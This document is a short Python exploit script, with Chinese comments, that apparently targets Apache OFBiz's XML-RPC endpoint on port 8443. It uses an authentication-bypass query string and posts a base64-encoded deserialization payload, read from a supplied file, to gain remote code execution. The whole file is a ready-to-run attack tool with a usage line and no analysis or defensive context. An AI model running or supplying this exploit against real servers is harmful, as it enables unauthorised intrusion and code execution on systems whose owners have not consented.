import requests
import base64
import sys

# 检查命令行参数数量
if len(sys.argv) != 3:
    print("Usage: python exp.py <target_ip> <payload_file>")
    sys.exit(1)

# 获取命令行参数
target_ip = sys.argv[1]
file_path = sys.argv[2]

# 读取文件内容并进行 base64 编码
with open(file_path, "rb") as file:
    base64_data = base64.b64encode(file.read()).decode("utf-8")

# 构建 XML-RPC 请求的 XML 内容
xml_content = f"""
<?xml version="1.0"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>test</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">{base64_data}</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
"""

# 构建 HTTP 请求头
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Upgrade-Insecure-Requests": "1",
}

# 构建请求 URL
url = f"http://{target_ip}:8443/webtools/control/xmlrpc?USERNAME&PASSWORD=test&requirePasswordChange=Y"

# 发送 POST 请求
response = requests.post(url, data=xml_content, headers=headers)

# 打印响应内容
print("Response:")
print(response.text)

